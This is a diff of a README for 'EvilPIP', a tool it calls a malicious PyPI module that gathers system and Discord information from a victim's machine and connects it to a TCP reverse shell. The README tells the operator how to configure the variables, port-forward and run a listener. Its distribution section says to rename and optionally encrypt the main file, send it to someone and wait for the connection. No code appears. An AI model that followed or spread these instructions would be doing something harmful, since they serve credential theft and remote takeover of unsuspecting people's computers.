@@ -1,10 +1,12 @@
 # EvilPIP 👿
-**EvilPIP is a Malicious PyPi Module/Malware with Discord Information Logger and Socket Reverse Shell**
+-- note: I'm going to update this soon as some functions aren't completed/working properly
+
+**EvilPIP is a Malicious PyPi Module/Malware with Information Logging and a TCP Reverse Shell**
 
 **What this does:**
-- Takes advantage of the fact that python has administrative privileges, therefore so do PyPi packages
+- Takes advantage of the fact that python modules run with administrative privileges
 - When executed, will gather system and discord information from the machine.
-- If the reverse shell option is enabled, the program will make the machine connect to your reverse shell
+- If the revshell option is enabled, the program will make the machine connect to your server
 
 # Usage 💻
 Edit the ***VARIABLES*** class with your information
@@ -20,17 +22,17 @@ In '__main__.py' and 'server/server.py' {
     Set 'buffer' to the buffer size (in bytes) that you want to send (optional)
 }
 ```
-If **REVSHELL** is enabled and you want the victim to connect to the reverse shell -
+If **REVSHELL** is enabled / you want the victim to connect to the reverse shell -
 
-    Port-Forward on the port you had chosen (look up a tutorial for your router/VPS)
+    If needed, port forward on the port you had chosen (look up a tutorial for your router/VPS)
 
 **When these steps are completed to your liking, you can move onto the distribution process**
 
 # Distribution methods 💾
 
-**If you set REVSHELL to True: Open 'server/server/server.py' on your own machine/VPS to wait for a reverse shell connection**
+**If you set REVSHELL to True: Open 'server/server/server.py' on your pc/server to listen for a connection**
 
-**Method 1: Sending file directly (only works if they have the dependencies)**
+**Method 1: Sending file directly (only works if they have python + the dependencies)**
 - Rename and encrypt (optional) the '__ main __.py' file
 - Send the file to someone directly and wait for a connection
 - When opened, evilpip should be executed
